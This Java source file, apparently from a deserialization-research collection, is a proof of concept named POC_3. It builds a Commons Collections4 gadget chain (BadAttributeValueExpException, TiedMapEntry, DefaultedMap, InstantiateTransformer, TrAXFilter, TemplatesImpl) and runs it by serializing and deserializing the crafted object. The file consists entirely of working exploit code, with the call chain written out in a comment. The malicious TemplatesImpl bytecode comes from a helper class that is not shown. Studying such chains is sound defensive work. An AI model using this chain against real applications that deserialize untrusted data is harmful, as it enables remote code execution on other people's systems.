package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class POC_3 {

    /***
     * <javax.management.BadAttributeValueExpException: void readObject(java.io.ObjectInputStream)>
     * <org.apache.commons.collections4.keyvalue.TiedMapEntry: java.lang.String toString()>
     * <org.apache.commons.collections4.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections4.functors.InstantiateTransformer: java.lang.Object transform(java.lang.Object)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter: void init(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: javax.xml.transform.Transformer newTransformer(javax.xml.transform.Templates)>
     * <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: com.sun.org.apache.xalan.internal.xsltc.Translet getTransletInstance(javax.xml.transform.Templates)>
     * <java.lang.reflect.Constructor: java.lang.Object newInstance(java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap<>(transformer);
        TiedMapEntry t = new TiedMapEntry<>(d, TrAXFilter.class);

        BadAttributeValueExpException b = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(b, "val", t);
        SerializeUtil.deserialize(SerializeUtil.serialize(b));
    }

}
